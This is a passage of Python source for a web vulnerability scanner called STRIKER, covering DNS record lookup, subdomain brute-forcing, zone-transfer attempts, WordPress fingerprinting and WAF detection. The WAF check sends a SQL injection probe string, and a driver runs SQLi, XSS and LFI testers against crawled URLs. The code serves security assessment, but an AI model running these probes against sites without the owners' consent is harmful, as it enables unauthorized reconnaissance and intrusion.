  <div class="footer">STRIKER v4.3 | Defensive OSINT Surface Analysis | {datetime.now().year}</div>
</div>

<script>
/* ── Matrix rain ── */
(function() {{
  const canvas = document.getElementById('matrix-canvas');
  const ctx    = canvas.getContext('2d');
  let W, H, cols, drops;
  const CHARS  = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ';
  function init() {{
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
    const fs = 14;
    cols  = Math.floor(W / fs);
    drops = Array(cols).fill(1);
  }}
  function draw() {{
    ctx.fillStyle = 'rgba(0,0,0,0.05)';
    ctx.fillRect(0, 0, W, H);
    ctx.fillStyle = '#00ff41';
    ctx.font      = '14px Courier New';
    drops.forEach((y, i) => {{
      const ch = CHARS[Math.floor(Math.random() * CHARS.length)];
      ctx.fillText(ch, i * 14, y * 14);
      if (y * 14 > H && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }});
  }}
  init();
  window.addEventListener('resize', init);
  setInterval(draw, 35);
}})();

/* ── Tabs ── */
function showTab(name) {{
  document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  event.target.classList.add('active');
}}

/* ── Search / filter ── */
function filterTable(tableId, query) {{
  const q    = query.toLowerCase();
  const rows = document.getElementById(tableId).querySelectorAll('tbody tr');
  rows.forEach(row => {{
    row.style.display = row.innerText.toLowerCase().includes(q) ? '' : 'none';
  }});
}}
</script>
</body>
</html>"""

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)

        log_success(f"Matrix HTML report saved → {filename}")
        return str(filename)


# ──────────────────────────────────────────────────────────────
# DNS SCANNER  (NEW – option 7)
# ──────────────────────────────────────────────────────────────
class DNSScanner:
    """
    Passive / active DNS surface analysis:
      • A / AAAA / CNAME / MX / NS / TXT / SOA record lookup
      • Subdomain enumeration via wordlist + socket resolution
      • Zone-transfer attempt (AXFR) – passive probe only
      • Outputs a Matrix-style HTML report
    """

    WORDLIST = [
        "www", "mail", "smtp", "pop", "pop3", "imap", "ftp", "sftp",
        "ns", "ns1", "ns2", "ns3", "dns", "dns1", "dns2",
        "api", "api2", "rest", "graphql", "gateway",
        "admin", "panel", "cpanel", "whm", "plesk",
        "dev", "development", "staging", "stage", "test", "uat", "qa",
        "demo", "sandbox", "preview", "beta", "alpha",
        "old", "new", "legacy", "backup", "bak",
        "blog", "news", "forum", "shop", "store", "ecommerce",
        "cdn", "media", "static", "assets", "img", "images",
        "vpn", "remote", "rdp", "ssh", "git", "svn",
        "jira", "confluence", "redmine", "jenkins", "ci", "cd",
        "monitor", "status", "health", "metrics", "grafana", "kibana",
        "mail2", "webmail", "autodiscover", "exchange",
        "portal", "intranet", "extranet", "app", "apps", "mobile",
        "crm", "erp", "helpdesk", "support", "tickets",
        "secure", "login", "auth", "sso", "oauth",
        "db", "database", "mysql", "mongo", "redis", "elastic",
        "proxy", "lb", "loadbalancer", "ha", "cluster",
        "m", "wap", "mobile", "pda",
    ]

    RECORD_TYPES = ["A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA"]

    def __init__(self, domain: str):
        # Accept full URL or bare domain
        if domain.startswith("http"):
            domain = get_domain_from_url(domain)
        self.domain    = domain.strip().lower()
        self.found_subs: List[Dict]  = []
        self.dns_records: Dict       = {}

    # ── DNS record lookup via system dig / nslookup ──────────
    def _dig(self, domain: str, rtype: str) -> List[str]:
        """Try dig, then nslookup, then socket for A."""
        # Try dig
        try:
            result = subprocess.run(
                ["dig", "+short", rtype, domain],
                capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                return [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Try nslookup
        try:
            result = subprocess.run(
                ["nslookup", "-type=" + rtype, domain],
                capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.strip().splitlines()
                answers = []
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith("Server") and \
                       not line.startswith("Address") and "NXDOMAIN" not in line:
                        answers.append(line)
                if answers:
                    return answers
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Fallback: socket only supports A/AAAA
        if rtype in ("A", "AAAA"):
            try:
                family = socket.AF_INET if rtype == "A" else socket.AF_INET6
                infos  = socket.getaddrinfo(domain, None, family)
                return list({info[4][0] for info in infos})
            except Exception:
                pass

        return []

    def get_dns_records(self) -> Dict:
        log_info(f"[DNS] Fetching records for {self.domain}")
        records = {}
        for rtype in self.RECORD_TYPES:
            data = self._dig(self.domain, rtype)
            if data:
                records[rtype] = data
                log_success(f"  {rtype:6s} → {', '.join(data[:3])}"
                            f"{'…' if len(data) > 3 else ''}")
            else:
                log_info(f"  {rtype:6s} → (no record)")
        self.dns_records = records
        return records

    # ── Subdomain enumeration ─────────────────────────────────
    def _resolve_sub(self, sub: str) -> Optional[Dict]:
        fqdn = f"{sub}.{self.domain}"
        ips  = self._dig(fqdn, "A")
        if ips:
            return {"subdomain": fqdn, "ips": ips, "cname": self._dig(fqdn, "CNAME")}
        return None

    def enumerate_subdomains(self, wordlist: Optional[List[str]] = None) -> List[Dict]:
        wl = wordlist or self.WORDLIST
        log_info(f"[DNS] Enumerating {len(wl)} subdomains for {self.domain}…")
        found = []
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self._resolve_sub, sub): sub for sub in wl}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    ips_str = ', '.join(result['ips'])
                    log_success(f"  FOUND  {result['subdomain']:45s} → {ips_str}")
        self.found_subs = sorted(found, key=lambda x: x['subdomain'])
        log_success(f"[DNS] {len(found)} subdomains discovered")
        return self.found_subs

    # ── Zone-transfer probe ───────────────────────────────────
    def try_zone_transfer(self) -> List[str]:
        """
        Attempt AXFR on each NS. Logs result – does NOT parse/exploit.
        Returns a list of NS servers that allowed the transfer (should be empty).
        """
        ns_servers = self.dns_records.get("NS", [])
        if not ns_servers:
            ns_servers = self._dig(self.domain, "NS")
        vulnerable_ns = []
        for ns in ns_servers:
            ns = ns.rstrip('.')
            log_info(f"[DNS] Attempting AXFR on {ns}…")
            try:
                result = subprocess.run(
                    ["dig", "AXFR", self.domain, f"@{ns}"],
                    capture_output=True, text=True, timeout=10)
                if "Transfer failed" in result.stdout or "timed out" in result.stdout:
                    log_info(f"  AXFR refused by {ns} ✓")
                elif result.stdout.strip():
                    log_warning(f"  AXFR may have succeeded on {ns} – review output!")
                    vulnerable_ns.append(ns)
            except (FileNotFoundError, subprocess.TimeoutExpired):
                log_info(f"  dig not available – AXFR skipped")
                break
        return vulnerable_ns

    # ── Matrix HTML report ────────────────────────────────────
    def generate_dns_html(self, output_dir: str = "./reports") -> str:
        Path(output_dir).mkdir(exist_ok=True)
        ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = Path(output_dir) / f"striker_dns_{self.domain}_{ts}.html"

        # Build records table
        rec_rows = ""
        for rtype, values in self.dns_records.items():
            for val in values:
                color_map = {"A": "#00ff41", "AAAA": "#00e5ff",
                             "MX": "#ffd700", "NS": "#ff9900",
                             "TXT": "#cc99ff", "CNAME": "#ff6699", "SOA": "#888"}
                color = color_map.get(rtype, "#aaa")
                rec_rows += (f'<tr>'
                             f'<td style="color:{color};font-weight:bold">{rtype}</td>'
                             f'<td>{val}</td>'
                             f'</tr>\n')
        if not rec_rows:
            rec_rows = '<tr><td colspan="2" class="empty">No records found</td></tr>'

        # Build subdomains table
        sub_rows = ""
        for s in self.found_subs:
            ips   = ', '.join(s['ips'])
            cname = ', '.join(s.get('cname', []))
            sub_rows += (f'<tr>'
                         f'<td><span style="color:#00ff41">{s["subdomain"]}</span></td>'
                         f'<td>{ips}</td>'
                         f'<td style="color:#666">{cname}</td>'
                         f'</tr>\n')
        if not sub_rows:
            sub_rows = '<tr><td colspan="3" class="empty">No subdomains found</td></tr>'

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>STRIKER DNS – {self.domain}</title>
  <style>
    :root {{
      --bg:#0a0a0a;--bg2:#111;--green:#00ff41;--dkgreen:#00b32c;
      --dim:#1a3a1a;--border:#1e5e1e;--text:#b8ffb8;--header:#003d00;
    }}
    * {{ box-sizing:border-box; margin:0; padding:0; }}
    body {{ background:var(--bg); color:var(--text);
            font-family:'Courier New',monospace; font-size:13px; }}
    #matrix-canvas {{ position:fixed;top:0;left:0;width:100%;height:100%;
                      z-index:0;opacity:.06;pointer-events:none; }}
    .wrapper {{ position:relative;z-index:1;padding:20px;max-width:1200px;margin:auto; }}
    .header {{ text-align:center;padding:30px 0 10px;border-bottom:2px solid var(--border);margin-bottom:20px; }}
    .header pre {{ color:var(--green);font-size:10px;text-shadow:0 0 8px var(--green); }}
    .header .sub {{ color:var(--dkgreen);margin-top:8px; }}
    .stats {{ display:flex;flex-wrap:wrap;gap:12px;margin-bottom:20px; }}
    .stat-box {{ flex:1 1 120px;background:var(--dim);border:1px solid var(--border);
                 border-radius:4px;padding:12px;text-align:center; }}
    .stat-box .num {{ font-size:26px;color:var(--green);font-weight:bold; }}
    .stat-box .lbl {{ font-size:10px;color:var(--dkgreen);text-transform:uppercase; }}
    .section {{ background:var(--bg2);border:1px solid var(--border);
                border-radius:4px;padding:16px;margin-bottom:20px; }}
    .section h2 {{ color:var(--green);font-size:13px;margin-bottom:12px;
                   text-transform:uppercase;letter-spacing:.1em; }}
    table {{ width:100%;border-collapse:collapse; }}
    th {{ background:var(--header);color:var(--green);padding:8px 12px;
          text-align:left;border-bottom:1px solid var(--border);
          font-size:11px;text-transform:uppercase; }}
    td {{ padding:6px 12px;border-bottom:1px solid #161616;word-break:break-all; }}
    tr:hover td {{ background:var(--dim); }}
    .empty {{ color:#333;text-align:center;padding:20px; }}
    .footer {{ text-align:center;color:#2a4a2a;padding:20px 0;
               font-size:11px;border-top:1px solid var(--border); }}
  </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div class="wrapper">
  <div class="header">
    <pre>DNS SCAN</pre>
    <div class="sub">DNS Surface Analysis — {self.domain}</div>
    <div style="color:#555;font-size:11px">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
  </div>

  <div class="stats">
    <div class="stat-box"><div class="num">{len(self.dns_records)}</div><div class="lbl">Record Types</div></div>
    <div class="stat-box"><div class="num">{sum(len(v) for v in self.dns_records.values())}</div><div class="lbl">Total Records</div></div>
    <div class="stat-box"><div class="num">{len(self.found_subs)}</div><div class="lbl">Subdomains</div></div>
    <div class="stat-box"><div class="num">{len(self.dns_records.get('MX', []))}</div><div class="lbl">Mail Servers</div></div>
    <div class="stat-box"><div class="num">{len(self.dns_records.get('NS', []))}</div><div class="lbl">Nameservers</div></div>
  </div>

  <div class="section">
    <h2>▸ DNS Records — {self.domain}</h2>
    <table>
      <thead><tr><th>Type</th><th>Value</th></tr></thead>
      <tbody>{rec_rows}</tbody>
    </table>
  </div>

  <div class="section">
    <h2>▸ Discovered Subdomains ({len(self.found_subs)})</h2>
    <table>
      <thead><tr><th>Subdomain</th><th>IP Address(es)</th><th>CNAME</th></tr></thead>
      <tbody>{sub_rows}</tbody>
    </table>
  </div>

  <div class="footer">STRIKER v4.3 | DNS Surface Analysis | {datetime.now().year}</div>
</div>
<script>
(function() {{
  const canvas=document.getElementById('matrix-canvas');
  const ctx=canvas.getContext('2d');
  let W,H,cols,drops;
  const CHARS='01アイウエオABCDEF0123456789';
  function init(){{W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight;
    cols=Math.floor(W/14);drops=Array(cols).fill(1);}}
  function draw(){{ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,W,H);
    ctx.fillStyle='#00ff41';ctx.font='14px Courier New';
    drops.forEach((y,i)=>{{const ch=CHARS[Math.floor(Math.random()*CHARS.length)];
      ctx.fillText(ch,i*14,y*14);
      if(y*14>H&&Math.random()>.975)drops[i]=0;drops[i]++;}});}}
  init();window.addEventListener('resize',init);setInterval(draw,35);
}})();
</script>
</body>
</html>"""

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        log_success(f"DNS HTML report saved → {filename}")
        return str(filename)

    # ── Full scan ─────────────────────────────────────────────
    def scan(self) -> Dict:
        log_title("DNS Surface Analysis")
        log_info(f"Target domain: {self.domain}")

        self.get_dns_records()
        self.enumerate_subdomains()
        self.try_zone_transfer()

        report_file = self.generate_dns_html()

        log_title("DNS Scan Summary")
        log_kv("Domain",          self.domain)
        log_kv("Record types",    str(len(self.dns_records)))
        log_kv("Subdomains found",str(len(self.found_subs)), bool(self.found_subs))
        log_success(f"Report: {report_file}")

        return {
            "domain":       self.domain,
            "dns_records":  self.dns_records,
            "subdomains":   self.found_subs,
            "report":       report_file,
        }


# ──────────────────────────────────────────────────────────────
# WORDPRESS DETECTOR
# ──────────────────────────────────────────────────────────────
class WordPressDetector:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")

    def is_wordpress(self) -> bool:
        try:
            resp = safe_request(self.base_url)
            if resp and "wp-content" in resp.text.lower():
                return True
        except Exception as e:
            log_warning(f"WP check error: {str(e)}")
        return False

    def detect_version(self) -> Optional[str]:
        try:
            resp = safe_request(f"{self.base_url}/readme.html")
            if resp and resp.status_code == 200:
                match = re.search(r"Version:\s*([\d\.]+)", resp.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except Exception:
            pass
        try:
            resp = safe_request(self.base_url)
            if resp:
                match = re.search(
                    r'<meta name="generator" content="WordPress\s*([\d\.]+)"',
                    resp.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except Exception:
            pass
        return None

    def detect_theme(self) -> Optional[str]:
        try:
            resp = safe_request(self.base_url)
            if resp:
                match = re.search(r"/wp-content/themes/([\w\-]+)/",
                                  resp.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except Exception:
            pass
        return None

    def check_theme_advisories(self, theme_name: str) -> List[Dict]:
        if not theme_name:
            return []
        return THEME_CVE_DB.get(theme_name.lower(), {}).get("advisories", [])

    def detect_plugins(self) -> List[str]:
        plugins: Set[str] = set()
        try:
            resp = safe_request(self.base_url)
            if resp:
                soup = BeautifulSoup(resp.text, "html.parser")
                for tag in soup.find_all(["script", "link"]):
                    src = tag.get("src") or tag.get("href")
                    if not src:
                        continue
                    match = re.search(r"/wp-content/plugins/([\w\-]+)/", src)
                    if match:
                        plugins.add(match.group(1))
        except Exception:
            pass
        return sorted(plugins)

    def _check_endpoint(self, path: str) -> bool:
        try:
            resp = safe_request(f"{self.base_url}{path}")
            return resp is not None and resp.status_code in (200, 401, 403)
        except Exception:
            return False

    def analyze_rest_api(self) -> Dict:
        data = {"enabled": False}
        try:
            resp = safe_request(f"{self.base_url}/wp-json/")
            if resp and resp.status_code == 200:
                json_data = resp.json()
                data.update({
                    "enabled":     True,
                    "site_name":   json_data.get("name"),
                    "description": json_data.get("description"),
                    "namespaces":  json_data.get("namespaces", []),
                })
        except Exception:
            pass
        return data

    def scan(self) -> Dict:
        log_info("Scanning for WordPress…")
        findings = {
            "is_wordpress": False, "version": None, "theme": None,
            "plugins": [], "endpoints": {}, "rest_api": {},
            "theme_advisories": [],
        }

        if not self.is_wordpress():
            log_warning("WordPress not detected")
            return findings

        findings["is_wordpress"]       = True
        findings["version"]            = self.detect_version()
        findings["theme"]              = self.detect_theme()
        findings["plugins"]            = self.detect_plugins()
        findings["theme_advisories"]   = self.check_theme_advisories(findings["theme"])
        findings["endpoints"] = {
            "wp_admin": self._check_endpoint("/wp-admin/"),
            "wp_login": self._check_endpoint("/wp-login.php"),
            "xmlrpc":   self._check_endpoint("/xmlrpc.php"),
            "rest_api": self._check_endpoint("/wp-json/"),
        }
        findings["rest_api"] = self.analyze_rest_api()

        log_title("WordPress Detection")
        log_kv("Detected", "YES", True)
        log_kv("Version", findings["version"] or "Not detected", bool(findings["version"]))
        if findings["theme"]:
            log_info(f"Active theme: {findings['theme']}")
        if findings["plugins"]:
            log_info(f"Plugins detected: {len(findings['plugins'])}")

        log_title("WordPress Endpoints")
        for ep, enabled in findings["endpoints"].items():
            log_kv(ep, "OPEN" if enabled else "CLOSED", enabled)

        # ← BUG FIX: advisory section was unreachable in original (after return)
        if findings["theme_advisories"]:
            log_warning(f"Public advisories for theme '{findings['theme']}':")
            for adv in findings["theme_advisories"]:
                log_info(f"  {adv['id']} | {adv['type']} | Severity: {adv['severity']}")
            log_info("  Note: Informational only. No exploitation performed.")

        return findings


# ──────────────────────────────────────────────────────────────
# WAF DETECTOR
# ──────────────────────────────────────────────────────────────
class WAFDetector:
    def __init__(self, base_url: str):
        self.base_url = base_url

    def detect_from_headers(self) -> Tuple[Optional[str], float]:
        try:
            resp = safe_request(self.base_url)
            if not resp:
                return None, 0.0
            headers = resp.headers
            for waf_name, signatures in WAF_SIGNATURES.items():
                matches = sum(1 for sig in signatures
                              for hv in headers.values()
                              if sig.lower() in str(hv).lower())
                if matches:
                    return waf_name, min(0.95, matches * 0.3)
        except Exception:
            pass
        return None, 0.0

    def detect_from_behavior(self) -> Tuple[Optional[str], float]:
        try:
            resp = safe_request(self.base_url, params={'test': "' OR '1'='1"})
            if resp and resp.status_code == 403:
                return "Unknown WAF", 0.7
        except Exception:
            pass
        return None, 0.0

    def scan(self) -> Dict:
        log_info("Detecting WAF…")
        waf, conf = self.detect_from_headers()
        if not waf:
            waf, conf = self.detect_from_behavior()
        result = {'waf_detected': waf is not None, 'waf_name': waf, 'confidence': conf}
        if waf:
            log_warning(f"WAF detected: {waf} (confidence: {conf:.0%})")
        else:
            log_success("No common WAF detected")
        return result


# ──────────────────────────────────────────────────────────────
# REPORT GENERATOR
# ──────────────────────────────────────────────────────────────
class ReportGenerator:
    def __init__(self, vulnerabilities: List[Vulnerability], output_dir: str = "./reports"):
        self.vulnerabilities = vulnerabilities
        self.output_dir      = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.timestamp       = datetime.now().strftime("%Y%m%d_%H%M%S")

    def generate_json(self) -> str:
        data = {
            'timestamp':            datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities':       [v.to_dict() for v in self.vulnerabilities],
            'summary':               self._get_summary(),
        }
        filename = self.output_dir / f"striker_report_{self.timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        return str(filename)

    def generate_csv(self) -> str:
        filename = self.output_dir / f"striker_report_{self.timestamp}.csv"
        with open(filename, 'w', newline='') as f:
            if self.vulnerabilities:
                writer = csv.DictWriter(f, fieldnames=self.vulnerabilities[0].to_dict().keys())
                writer.writeheader()
                for vuln in self.vulnerabilities:
                    writer.writerow(vuln.to_dict())
        return str(filename)

    def generate_html(self) -> str:
        rows = ""
        for vuln in self.vulnerabilities:
            sc = vuln.severity.lower()
            rows += f"""
        <tr>
          <td><code>{vuln.target}</code></td>
          <td>{vuln.vuln_type}</td>
          <td><code>{vuln.parameter}</code></td>
          <td class="{sc}">{vuln.severity}</td>
          <td>{vuln.confidence:.0%}</td>
          <td><code>{vuln.payload[:60]}</code></td>
          <td>{vuln.proof}</td>
        </tr>"""

        html = f"""<!DOCTYPE html><html><head><title>Striker Report</title>
<meta charset="UTF-8">
<style>
  body{{font-family:Arial,sans-serif;margin:20px;background:#f5f5f5}}
  h1{{color:#333;border-bottom:3px solid #d32f2f;padding-bottom:10px}}
  table{{width:100%;border-collapse:collapse;background:#fff;margin-bottom:20px}}
  th,td{{padding:12px;text-align:left;border-bottom:1px solid #ddd}}
  th{{background:#d32f2f;color:#fff}}
  tr:hover{{background:#f5f5f5}}
  .summary{{background:#e3f2fd;padding:15px;border-radius:5px;margin-bottom:20px}}
  .critical{{color:#d32f2f;font-weight:bold}}
  .high{{color:#f57c00;font-weight:bold}}
  .medium{{color:#fbc02d;font-weight:bold}}
  .low{{color:#388e3c;font-weight:bold}}
  code{{background:#f4f4f4;padding:2px 6px;border-radius:3px;font-family:monospace}}
</style></head><body>
<h1>🔐 STRIKER v4.3 — Security Assessment Report</h1>
<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<div class="summary">{self._get_summary_html()}</div>
<h2>Vulnerabilities</h2>
<table>
  <tr><th>Target</th><th>Type</th><th>Parameter</th><th>Severity</th>
      <th>Confidence</th><th>Payload</th><th>Proof</th></tr>
  {rows if rows else '<tr><td colspan="7" style="text-align:center">No vulnerabilities detected.</td></tr>'}
</table></body></html>"""

        filename = self.output_dir / f"striker_report_{self.timestamp}.html"
        with open(filename, 'w') as f:
            f.write(html)
        return str(filename)

    def _get_summary(self) -> Dict:
        s = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'by_type': {}}
        for v in self.vulnerabilities:
            s[v.severity.lower()] += 1
            s['by_type'][v.vuln_type] = s['by_type'].get(v.vuln_type, 0) + 1
        return s

    def _get_summary_html(self) -> str:
        s = self._get_summary()
        return f"""<h3>Summary</h3><p>
<strong>Total:</strong> {len(self.vulnerabilities)}<br>
<strong>Critical:</strong> <span class="critical">{s['critical']}</span> |
<strong>High:</strong> <span class="high">{s['high']}</span> |
<strong>Medium:</strong> <span class="medium">{s['medium']}</span> |
<strong>Low:</strong> <span class="low">{s['low']}</span></p>"""

    def generate_all(self) -> List[str]:
        files = [self.generate_json(), self.generate_csv(), self.generate_html()]
        log_success(f"Reports saved in {self.output_dir}")
        for f in files:
            log_success(f"  ✓ {Path(f).name}")
        return files


# ──────────────────────────────────────────────────────────────
# MAIN SCANNER
# ──────────────────────────────────────────────────────────────
class StrikerScanner:
    def __init__(self, target_url: str):
        if not is_valid_url(target_url):
            raise ValueError("Invalid URL")
        self.target_url      = target_url
        self.vulnerabilities: List[Vulnerability]     = []
        self.crawled_data:    Dict[str, CrawledURL]   = {}
        self.all_findings:    Dict                    = {}
        self._vuln_signatures: Set[str]               = set()

    def _add_vulnerabilities(self, vulns: List[Vulnerability]):
        for v in vulns:
            sig = f"{v.target}|{v.parameter}|{v.technique}"
            if sig not in self._vuln_signatures:
                self._vuln_signatures.add(sig)
                self.vulnerabilities.append(v)

    def _scan_with_threads(self, urls: List[str],
                           tester_method, max_workers: int = 5):
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(tester_method, url) for url in urls[:20]]
            for future in as_completed(futures):
                try:
                    self._add_vulnerabilities(future.result())
                except Exception as e:
                    log_warning(f"Thread error: {e}")

    def scan_sql_injection(self, urls: List[str]):
        log_info(f"Starting SQL Injection scan ({len(urls)} URLs)")
        tester = SQLiTester()

        def process(url):
            params = parse_qs(urlparse(url).query)
            vulns  = []
            for name, vals in params.items():
                vulns.extend(tester.test_parameter(url, name, vals[0] if vals else ""))
            return vulns

        self._scan_with_threads(urls, process)

    def scan_xss(self, urls: List[str]):
        log_info(f"Starting XSS scan ({len(urls)} URLs)")
        tester = XSSTester()

        def process(url):
            params = parse_qs(urlparse(url).query)
            vulns  = []
            for name in params.keys():
                vulns.extend(tester.test_parameter(url, name))
            return vulns

        self._scan_with_threads(urls, process)

    def scan_lfi(self, urls: List[str]):
        log_info(f"Starting LFI scan ({len(urls)} URLs)")
        tester = LFITester()

        def process(url):
            params = parse_qs(urlparse(url).query)
            vulns  = []
            for name in params.keys():
                vulns.extend(tester.test_parameter(url, name))
            return vulns

        self._scan_with_threads(urls, process)

    def advanced_scan(self, max_depth: int = 3):
        log_info("=" * 70)
        log_info("STRIKER v4.3 — ADVANCED VULNERABILITY SCAN")
        log_info("=" * 70)

        crawler = AdvancedCrawler(self.target_url, max_depth=max_depth)
        self.crawled_data = crawler.crawl()

        urls_with_params = [u for u, d in self.crawled_data.items() if d.parameters]
        if urls_with_params:
            self.scan_sql_injection(urls_with_params)
            self.scan_xss(urls_with_params)
            self.scan_lfi(urls_with_params)
        else:
            log_warning("No URLs with parameters found")

        self.all_findings['wordpress'] = WordPressDetector(self.target_url).scan()
        self.all_findings['waf']       = WAFDetector(self.target_url).scan()

        reporter = ReportGenerator(self.vulnerabilities)
        report_files = reporter.generate_all()

        log_info("=" * 70)
        log_success(f"Scan complete! {len(self.vulnerabilities)} vulnerabilities found")
        log_info("=" * 70)
        return report_files


# ──────────────────────────────────────────────────────────────
# BANNER & MENU
# ──────────────────────────────────────────────────────────────
def print_banner():
    print(f"""{Fore.RED}
    ╔════════════════════════════════════════════════════════════════════════╗
    ║                                                                        ║
    ║               STRIKER v4.3 - github.com/xPloits3c/Striker              ║
    ║                    OSINT Web Vulnerability Scanner                     ║
    ║                                                                        ║
    ║       | Defensive Security Assessment | Attack Surface Analysis        ║
    ╚════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.YELLOW}[!] DISCLAIMER:{Style.RESET_ALL}
{Fore.GREEN}•{Style.RESET_ALL}{Fore.RED} Attacking targets without prior mutual consent is illegal.{Style.RESET_ALL}
{Fore.GREEN}•{Style.RESET_ALL}{Fore.RED} It is the end user's responsibility to obey all applicable local, state and federal laws.{Style.RESET_ALL}
""")


def _get_target(prompt: str = "Enter target URL: ") -> Optional[str]:
    target = input(prompt).strip()
    if not is_valid_url(target):
        log_error("Invalid URL")
        return None
    return target


def _get_target_or_domain(prompt: str = "Enter target URL or domain: ") -> Optional[str]:
    val = input(prompt).strip()
    if not val:
        log_error("Empty input")
        return None
    # Accept bare domains too (for DNS)
    if not val.startswith("http"):
        val = "https://" + val
    return val


def main_menu():
    print_banner()
    while True:
        print(f"""
{Fore.BLUE}┌─ MAIN MENU ──────────────────────────────────────────────┐{Style.RESET_ALL}
{Fore.WHITE}  1) {Fore.YELLOW}Param Crawler{Style.RESET_ALL}
  2) {Fore.YELLOW}SQLi{Style.RESET_ALL}
  3) {Fore.YELLOW}XSS{Style.RESET_ALL}
  4) {Fore.YELLOW}LFI{Style.RESET_ALL}
  5) {Fore.YELLOW}WP{Style.RESET_ALL}
  6) {Fore.YELLOW}WAF{Style.RESET_ALL}
  7) {Fore.YELLOW}DNS{Style.RESET_ALL}
  8) {Fore.YELLOW}Full Link Extractor{Style.RESET_ALL}
  0) {Fore.RED}Exit{Style.RESET_ALL}
{Fore.BLUE}└──────────────────────────────────────────────────────────┘{Style.RESET_ALL}
""")
        choice = input("Select option: ").strip()

        # ── 1: Advanced Scan ─────────────────────────────────
        if choice == "1":
            target = _get_target("Enter target URL: ")
            if not target:
                continue
            depth = input("Max crawl depth (1-5, default 3): ").strip()
            try:
                depth = max(1, min(5, int(depth))) if depth else 3
            except Exception:
                depth = 3
            try:
                StrikerScanner(target).advanced_scan(max_depth=depth)
            except Exception as e:
                log_error(f"Scan error: {e}")

        # ── 2: SQLi ──────────────────────────────────────────
        elif choice == "2":
            target = _get_target()
            if not target:
                continue
            try:
                scanner = StrikerScanner(target)
                if has_parameters(target):
                    log_info("Parameter detected, running SQL Injection…")
                    scanner.scan_sql_injection([target])
                else:
                    log_info("No params – starting crawler…")
                    crawled = AdvancedCrawler(target, max_depth=4).crawl()
                    urls = [u for u, d in crawled.items() if d.parameters]
                    scanner.scan_sql_injection(urls)
            except Exception as e:
                log_error(f"SQLi scan error: {e}")

        # ── 3: XSS ───────────────────────────────────────────
        elif choice == "3":
            target = _get_target()
            if not target:
                continue
            try:
                scanner = StrikerScanner(target)
                if has_parameters(target):
                    log_info("Direct parameter detected – running XSS…")
                    scanner.scan_xss([target])
                else:
                    log_info("No params – starting crawler…")
                    crawled = AdvancedCrawler(target, max_depth=2).crawl()
                    urls = [u for u, d in crawled.items() if d.parameters]
                    scanner.scan_xss(urls)
            except Exception as e:
                log_error(f"XSS scan error: {e}")

        # ── 4: LFI ───────────────────────────────────────────
        elif choice == "4":
            target = _get_target()
            if not target:
                continue
            try:
                scanner = StrikerScanner(target)
                if has_parameters(target):
                    log_info("Direct parameter detected – running LFI…")
                    scanner.scan_lfi([target])
                else:
                    log_info("No params – starting crawler…")
                    crawled = AdvancedCrawler(target, max_depth=2).crawl()
                    urls = [u for u, d in crawled.items() if d.parameters]
                    scanner.scan_lfi(urls)
            except Exception as e:
                log_error(f"LFI scan error: {e}")

        # ── 5: WordPress ─────────────────────────────────────
        elif choice == "5":
            target = _get_target()
            if not target:
                continue
            try:
                WordPressDetector(target).scan()
            except Exception as e:
                log_error(f"WordPress detection error: {e}")

        # ── 6: WAF ───────────────────────────────────────────
        elif choice == "6":
            target = _get_target()
            if not target:
                continue
            try:
                WAFDetector(target).scan()
            except Exception as e:
                log_error(f"WAF detection error: {e}")

        # ── 7: DNS ───────────────────────────────────────────
        elif choice == "7":
            raw = input("Enter target domain or URL (e.g. example.com): ").strip()
            if not raw:
                log_error("Empty input")
                continue
            custom_wl = input(
                "Custom wordlist file path (leave blank to use default): ").strip()
            wordlist = None
            if custom_wl:
                try:
                    with open(custom_wl) as f:
                        wordlist = [l.strip() for l in f if l.strip()]
                    log_info(f"Loaded {len(wordlist)} entries from {custom_wl}")
                except Exception as e:
                    log_warning(f"Could not load wordlist: {e}. Using default.")
            try:
                DNSScanner(raw).scan()
                if wordlist:
                    DNSScanner(raw).enumerate_subdomains(wordlist)
            except Exception as e:
                log_error(f"DNS scan error: {e}")

        # ── 8: Full Link Extractor ───────────────────────────
        elif choice == "8":
            target = _get_target("Enter target URL: ")
            if not target:
                continue
            depth = input("Max crawl depth (1-6, default 3): ").strip()
            try:
                depth = max(1, min(6, int(depth))) if depth else 3
            except Exception:
                depth = 3
            max_urls = input("Max URLs to visit (default 5000): ").strip()
            try:
                max_urls = int(max_urls) if max_urls else 5000
            except Exception:
                max_urls = 5000
            try:
                crawler = FullLinkCrawler(target, max_depth=depth, max_urls=max_urls)
                links   = crawler.crawl()
